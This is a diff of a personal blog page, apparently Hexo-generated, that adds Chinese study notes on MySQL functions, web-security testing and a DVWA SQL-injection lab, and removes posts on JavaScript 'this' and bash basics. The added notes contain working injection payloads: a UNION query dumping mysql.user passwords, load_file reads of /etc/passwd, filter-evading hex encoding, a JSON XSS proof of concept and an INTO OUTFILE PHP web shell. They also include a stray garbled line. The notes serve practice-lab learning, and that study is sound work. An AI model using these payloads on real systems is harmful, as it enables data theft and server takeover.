@@ -79,6 +79,141 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/11/13/2015/sql函数/" title="sql日常记录" itemprop="url">sql日常记录</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-13T13:36:59.779Z" itemprop="datePublished"> 发表于 11-13-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <ol>
+<li>字符串截取<br> left(str, len);    /    right(str, len);        //len&gt;= 0<br> i.e.    :    select left(‘abcde’, 4);            //截取前面四个</li>
+<li>char(60,112,62)<br> <p>            //可以用来字符截取,字太多了</p></li>
+<li>version()            -&gt;5.6.11</li>
+<li>limit m,n           m-start      n—length<br>limit n             n—length</li>
+<li>cast(value as type)       获取一个类型的值,并转换类型<br>convert(type ,value)      转换类型      type -&gt;signed unsigned<br>cast(‘a’ as signed)             返回0        cast(‘123’ as int)    返回123<br>convert( int ,’123’)        返回123</li>
+<li>concat( a, b)  连接函数,对ab进行连接</li>
+<li>mit(a,1,50)       1-50 截取字符串</li>
+<li>select * from (xxx)a    a为别名</li>
+<li>group by xx   以字段分类</li>
+<li>select count(*)   返回统计的行数</li>
+<li>0x7171    类似于高亮,更加明显</li>
+<li>IFNULL(a,0x22)        判断是否为NULL,是的话就返回0x22,否则返回a</li>
+<li>0x7423 的写法可以规避单引号过滤 </li>
+<li>distinct 过滤重复</li>
+<li>group_concat( user ,0x3a, password)<br>group_concat()会计算哪些行属于同一组,将属于同一组的列显示出来.要返回哪些列,由函<br>数参数(就是字段名)决定.分组必须有个标准,就是根据group by指定的列进行分组    <a href="http://www.cnblogs.com/wangtao_20/archive/2011/02/23/1961860.html" target="_blank" rel="external">王滔’s blog</a></li>
+<li>char(115)  unicode-&gt;string</li>
+<li>version()  @@version         版本号</li>
+<li>@@datadir         mysql物理路径</li>
+<li>user()     当前的mysql用户        example: root@localhost</li>
+<li>load_file()     加载物理路径,需要file_priv权限<br>windows: load_file(‘c:\boot.ini’)<br>linux:     load_file(‘/etc/passwd’)<br>可以利用hex编码避免php的正则匹配 load_file(0x编码后字符)</li>
+<li></li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/13/2015/sql函数/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/13/2015/sql函数/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/11/13/2015/web安全测试/" title="web安全测试读书笔记" itemprop="url">web安全测试读书笔记</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-12T16:00:00.000Z" itemprop="datePublished"> 发表于 11-13-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h3 id="wget_作镜像">wget 作镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://a.com -r -R <span class="string">'*.gif,*.jpg,*.png,*.css,*.js'</span></span><br><span class="line">wget http://b.com -r -A <span class="string">'*.html,*.htm,*.php,*.asp,*.aspx,*.jsp,*do'</span></span><br></pre></td></tr></table></figure>
+<p>-r 递归扫描 —depth 1 只扫到一级目录<br>-A  accept 接受的文件类型<br>-R  reject  拒绝的文件类型<br>—http-user —http-password   身份认证<br>—save-cookies  —load-cookies    存储/加载cookies<br>—log   存储日志</p>
+<h3 id="openSSL_的base64">openSSL 的base64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#decode</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'b3BlbnNzbA=='</span> | openssl base64 <span class="operator">-d</span>   <span class="comment">#-d decode</span></span><br><span class="line"><span class="comment">#encode</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">'openssl'</span> | openssl base64 <span class="operator">-e</span>   <span class="comment">#-e encode</span></span><br><span class="line"><span class="comment">#注意 -n必需        -n就表示不输入回车符</span></span><br><span class="line"><span class="comment">#code with file</span></span><br><span class="line">openssl base64 <span class="operator">-e</span>/<span class="operator">-d</span> -in   input.txt  -out output.txt</span><br></pre></td></tr></table></figure>
+<p>cookie 一般使用base64编码</p>
+<p>openssl还<code>支持rsa md2 md5 sha sha1 sha224 sha256 sha384 sha512 des3</code>编码,棒!</p>
+<h4 id="openssl_md5">openssl_md5</h4><p>a.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a</span></span><br><span class="line"><span class="number">1</span>. openssl </span><br><span class="line"><span class="number">2</span>. 输入md5后回车</span><br><span class="line"><span class="number">3</span>. 接着输入<span class="number">123456</span>,不要输入回车.然后按<span class="number">3</span>次ctrl+d.</span><br><span class="line"><span class="number">4</span>. 输出密文</span><br><span class="line"><span class="comment">#b</span></span><br><span class="line"> <span class="built_in">echo</span> -n <span class="number">123456</span> | openssl md5</span><br></pre></td></tr></table></figure></p>
+<p>其他同理~</p>
+<h3 id="JSON_attack_xss">JSON attack xss</h3><p>应该算是个存储型吧<br>AJAX组件通过JavaScript对象符号JSON来接受输入,即<code>JSON内的数据接受javascript的解析</code></p>
+<h4 id="JSON解析原理:">JSON解析原理:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse()</span><br><span class="line"><span class="comment">//解析JSON字符串, 可以选择改变前面解析后的值及其属性,然后返回解析的值.</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify()</span><br><span class="line"><span class="comment">//返回指定值的 JSON 字符串,可以自定义只包含某些特定的属性或替换属性值.</span></span><br><span class="line"><span class="keyword">var</span> code = <span class="string">'"nihao"'</span>;</span><br><span class="line"><span class="built_in">JSON</span>.parse(code);</span><br><span class="line"><span class="built_in">eval</span>(code);</span><br></pre></td></tr></table></figure>
+<h4 id="example:">example:</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "<span class="attribute">menu</span>":</span><br><span class="line">  <span class="value">&#123;</span><br><span class="line">    "<span class="attribute">address</span>":</span><br><span class="line">    <span class="value">&#123;</span><br><span class="line">      "<span class="attribute">line1</span>":<span class="value"><span class="string">"User Inputs"</span></span>,</span><br><span class="line">      "<span class="attribute">line2</span>":<span class="value"><span class="string">"Beijing"</span></span>,</span><br><span class="line">      "<span class="attribute">line3</span>":<span class="value"><span class="string">"Shanghai"</span></span><br><span class="line">    </span>&#125;</span><br><span class="line">  </span>&#125;</span><br><span class="line"></span>&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="POC:">POC:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- User Inputs: --&gt;</span><br><span class="line">",                        //闭合</span><br><span class="line">xxx1:alert(/xss/),    //xxx1,xxx2则为语法需要,任意即可</span><br><span class="line">xxx2:"        //闭合</span><br></pre></td></tr></table></figure>
+<h4 id="解析之后">解析之后</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(&#123;</span><br><span class="line">  <span class="string">"menu"</span>:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"address"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"line1"</span>:<span class="string">""</span>,xxx1:alert(<span class="regexp">/xss/</span>),xxx2:<span class="string">" "</span>,</span><br><span class="line">      <span class="string">"line2"</span>:<span class="string">"Beijing"</span>,</span><br><span class="line">      <span class="string">"line3"</span>:<span class="string">"Shanghai"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>Other :<br>查找网站平台/框架<br>  <meta>  注释 页头信息(header)</p>
+<h3 id="Pending">Pending</h3><ol>
+<li>curl 自动化xss检测 &amp;&amp; 目录遍历    P137 单独blog</li>
+<li>Command Injection</li>
+<li>Xpath Injection</li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/13/2015/web安全测试/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/13/2015/web安全测试/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/11/12/2015/daily/" title="linux日常更新" itemprop="url">linux日常更新</a>
   </h1>
   <p class="article-author">By
@@ -209,6 +344,70 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 	
 	  	<span></span>
 		<a href="/11/12/2015/daily/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/12/2015/daily/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/11/10/2015/mysqlDvwa/" title="DVWA-SQLInject" itemprop="url">DVWA-SQLInject</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-09T16:00:00.000Z" itemprop="datePublished"> 发表于 11-10-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断段数</p>
+<h3 id="0x01_union_select_1,2,3_—">0x01 union select 1,2,3  —</h3><p>用来判断在web显示的字段长度,长度不匹配就会返回错误<br><code>如果知道字段和表</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_id =<span class="number">1</span>)<span class="comment">--     '</span></span></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02_获取库名">0x02 获取库名</h3><p>一旦可以进行union操作,即可利用information_schema.schemata<br>union虽然限制了显示内容,但是我们可以利用concat_ws()进行字符串连接增加显示<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()))<span class="comment">--            </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure></p>
+<p>concat_ws(‘ ‘,      ‘a’,’b’)     字符串连接函数,用空格连接a和b<br>char(32,58,32)                     unicode转字符<br>user()              返回当前用户<br>database()     当前数据库<br>version()         Mysql版本</p>
+<h3 id="0x03_获取版本信息_数据库">0x03 获取版本信息 数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,schema_name <span class="keyword">from</span> information_schema.schemata<span class="comment">-- </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure>
+<p>information_schema.schemata     这个表显示的是所有的表名</p>
+<h3 id="0x04_显示当前的用户名和密码">0x04 显示当前的用户名和密码</h3><p>concat(user, ‘:’ , password);                 //和concat_ws()有所不一样,直接连接<br>1’union select 1,(concat(user,’:’,password)) from mysql.user—<br>//读取mysql数据库中user表的user和password字段内容</p>
+<h3 id="0x05_读取系统文件">0x05 读取系统文件</h3><p>load_file(‘../../xx.txt’);          文件目录不能无限../<br>load_file(‘E:/xampp/xx.text’);      //可以直接用这个方法</p>
+<h3 id="0x06_注入点直接写入shell">0x06 注入点直接写入shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'union select 1,     "&lt;?php</span><br><span class="line">system($_GET('</span>hexo<span class="string">'));    //hexo作为一个变量</span><br><span class="line">?&gt;" into outfile '</span>../../shell.php<span class="string">'--</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x1_Low_Blind_Injection">0x1 Low Blind Injection</h2><h3 id="0x01_判断是否存在注入点">0x01  判断是否存在注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(4)<span class="comment">-- </span></span><br><span class="line">'</span><br></pre></td></tr></table></figure>
+<p>如果存在注入点,网页会在4秒之后才会有反应</p>
+<h3 id="0x02_后面">0x02 后面</h3><p>和普通的一样,把最后一个换成<code>sleep(5)</code><br>sleep()如果sleep无效试试benchmark()[MySQL5.0以下]//这个没试过,以后直接查询手册即可</p>
+<p>其他的也都差不多</p>
+<h3 id="0x03_Medium_&amp;_High">0x03 Medium &amp; High</h3><p>Medium:   @直接关闭了错误回显<br>//这个的话盲注依然可以,但是需要耐心了<br>High:   检测是否被攻击,然后0-5秒内自动sleep()<br>//也需要时间把,更多而已,设成10秒就可以很明显了,结合F12的network看一下就行了</p>
+<h3 id="SQLMAP基本用法:">SQLMAP基本用法:</h3><p>定了注入的URL<br>-p 参数指定了注入的参数，这里指定了id，也就是通过URL中的id参数注入，遇到多参数的URL时候这个-p就十分有用了。<br>—current-db，让SQLMAP列举出当前的数据库名称<br>-v 这个参数这里并没有使用到，这个参数会改变输出log的详细程度，一般默认即可，如果是学习或是想查看sqlmap使用的payload，可以使用-v 3参数。<br>—level 这个很有bi用咯，我个人理解是提高检测的等级，也就是说level 3会比level 1使用更多的payload进行测试。</p>
+<h2 id="小技巧">小技巧</h2><p>id = -1 也可以实现报错,在没有引号的情况跟之下23w32217uy7yuhjnm 65ythggb</p>
+<h2 id="Reference">Reference</h2><p>Web漏洞实战教程 DVWA的使用和漏洞分析</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/10/2015/mysqlDvwa/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/10/2015/mysqlDvwa/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -590,175 +789,6 @@ noauto          开机不自动挂载
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/16/2015/jsThis/" title="Js--头疼的this" itemprop="url">Js--头疼的this</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-15T16:00:00.000Z" itemprop="datePublished"> 发表于 10-16-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="优先参考">优先参考</h2><p><a href="http://www.ibm.com/developerworks/cn/web/1207_wangqf_jsthis/" target="_blank" rel="external">IBM</a><br>推荐先看IBM的链接<br><blockquote><p>在Java等面向对象的语言中，this关键字的含义是明确且具体的，即指代当前对象。一般在编译期确定下来，或称为编译期绑定.JavaScript中，this 是动态绑定，或称为运行期绑定.</p>
-<footer><strong>developerWorks中国</strong><cite>IBM</cite></footer></blockquote></p>
-<p>然而javascript使用运行期绑定的this简直丧心病狂,啥对象都能变2333</p>
-<h3 id="this的四种调用">this的四种调用</h3><h4 id="1-作为对象方法调用">1.作为对象方法调用</h4><p>Note1.js:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> point = &#123; </span><br><span class="line">    x : <span class="number">0</span>, </span><br><span class="line">    y : <span class="number">0</span>, </span><br><span class="line">    moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123; </span><br><span class="line">       <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">       <span class="keyword">this</span>.x = <span class="keyword">this</span>.x + x; </span><br><span class="line">       <span class="keyword">this</span>.y = <span class="keyword">this</span>.y + y; </span><br><span class="line">       <span class="built_in">console</span>.log(<span class="keyword">this</span>.x);</span><br><span class="line">       &#125; </span><br><span class="line">    &#125;; </span><br><span class="line">    point.moveTo(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//输出结果: 0   1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//moveTo()函数隶属于point对象,this即归为point对象</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="2-作为函数调用">2.作为函数调用</h4><p>Note2.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">noSense</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line">    noSense(<span class="number">5</span>);</span><br><span class="line">    alert(<span class="built_in">window</span>.x);    <span class="comment">//5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//this跟着原型链向上递归查找,之后找到window对象,并进行绑定</span></span><br></pre></td></tr></table></figure></p>
-<p>Note3.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> point = &#123; </span><br><span class="line"> x : <span class="number">0</span>, </span><br><span class="line"> moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">     <span class="comment">// 内部函数</span></span><br><span class="line">     <span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">     <span class="keyword">this</span>.x = x;<span class="comment">//this 绑定到了哪里？</span></span><br><span class="line">    &#125;; </span><br><span class="line">    moveX(x); </span><br><span class="line">    &#125; </span><br><span class="line"> &#125;; </span><br><span class="line"> point.moveTo(<span class="number">1</span>); </span><br><span class="line"> alert(point.x); <span class="comment">// 0 </span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="built_in">window</span>.x); <span class="comment">//   1 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//虽然Note3.js在内部函数使用了this,但是this依然绑定了window对象</span></span><br></pre></td></tr></table></figure></p>
-<p>这属于<code>JavaSctipt的设计缺陷</code>,导致this无法绑定外层函数对象</p>
-<p>然而机智的JS玩家利用变量替换解决了这个问题,而替换this的变量一般命名为<code>that</code>,下面是修复的程序</p>
-<p>Note3Fix.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> point = &#123;</span><br><span class="line">x : <span class="number">0</span>, </span><br><span class="line">moveTo : <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">   alert(<span class="keyword">this</span>);    <span class="comment">//执行过程中,this还未绑定,alert-&gt;[object Object]</span></span><br><span class="line">   <span class="keyword">var</span> that = <span class="keyword">this</span>;    <span class="comment">//[个人理解为是一个继承,请无视!]</span></span><br><span class="line">   <span class="comment">// 内部函数</span></span><br><span class="line">   <span class="keyword">var</span> moveX = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">   that.x = x;</span><br><span class="line">   &#125;; </span><br><span class="line">   moveX(x); </span><br><span class="line">   &#125; </span><br><span class="line">&#125;; </span><br><span class="line">point.moveTo(<span class="number">1</span>); </span><br><span class="line">alert(point.x); <span class="comment">//   1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.x); <span class="comment">//  一个无关的value</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="3-作为构造函数调用">3.作为构造函数调用</h4><p>Note4.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> Point = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.x = x;</span><br><span class="line"> &#125;(<span class="number">1</span>);</span><br><span class="line"> alert(Point.x);    <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//JavaScript使用基于原型（prototype）的继承方式.相应的,JavaScript 中的构造函数也很特殊,如果不使用 new 调用,则和普通函数一样.作为又一项约定俗成的准则，构造函数以大写字母开头，提醒调用者使用正确的方式调用.如果调用正确，this 绑定到新创建的对象上--By IBM</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="4-apply/call调用">4.apply/call调用</h4><p>JS中万物皆对象,对象有方法,而apply和call即为<code>函数对象的方法</code>,他们允许切换函数执行的上下文环境(context)[即更换this绑定对象]</p>
-<p>Note5.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">this</span>.x = x; </span><br><span class="line">    <span class="keyword">this</span>.y = y; </span><br><span class="line">    <span class="keyword">this</span>.moveTo = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>)</span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.x = x; </span><br><span class="line">        <span class="keyword">this</span>.y = y; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">//构造函数生成p1对象</span></span><br><span class="line"><span class="keyword">var</span> p2 = &#123;x: <span class="number">0</span>, y: <span class="number">0</span>&#125;; </span><br><span class="line">p1.moveTo(<span class="number">1</span>, <span class="number">1</span>); </span><br><span class="line">p1.moveTo.apply(p2, [<span class="number">10</span>, <span class="number">10</span>]);  <span class="comment">//apply()使p2可以完整的使用p1的方法,call同理</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="理解this,这个很重要">理解this,这个很重要</h3><p><a href="http://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/" target="_blank" rel="external">Understanding JavaScript Function Invocation and “this”</a>——Yehuda Katz表示:<br><code>作为函数调用时，this 绑定到全局对象；作为方法调用时，this 绑定到该方法所属的对象</code></p>
-<h3 id="执行环境因素(ExecutionContext)">执行环境因素(ExecutionContext)</h3><h4 id="Function-bind">Function.bind</h4><p>Note_1.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//code</span></span><br><span class="line">&#125;</span><br><span class="line">button.onclick = myObject.handler;  <span class="comment">//wrong</span></span><br><span class="line">button.onclick = lang.hitch(myObject, myObject.handler); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这个handler自己不是很清楚.原文[IBM]..不过理解什么意思,函数return之前,this已经被绑定.so...</span></span><br></pre></td></tr></table></figure></p>
-<h4 id="eval方法">eval方法</h4><p>eval()在执行中,()之内的this被eval完整继承</p>
-<h3 id="后记">后记</h3><p><a href="http://www.zhihu.com/question/19878052" target="_blank" rel="external">var foo = function(){}和function foo()的区别-知乎</a> 可以配合前面讲到的看看</p>
-<p>[js在运行期进行绑定,又由于本身是解释性语言,所以使得this绑定很奇怪(个人见解,未论证,无视!)]</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/16/2015/jsThis/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/16/2015/jsThis/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/15/2015/bash2/" title="bash基本命令2" itemprop="url">bash基本命令2</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-14T16:00:00.000Z" itemprop="datePublished"> 发表于 10-15-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="创建简单的bash脚本">创建简单的bash脚本</h3><p>example.sh: //脚本放置于/home/tools/路径<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">"Input Sth:"</span> sth</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$sth</span> <span class="string">"is your inputs"</span></span><br><span class="line"><span class="built_in">exit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="创建环境变量,使-sh在任何路径下使用">创建环境变量,使.sh在任何路径下使用</h3><p>: 隔开路径<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mypath=/home/tools/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$mypath</span></span><br></pre></td></tr></table></figure></p>
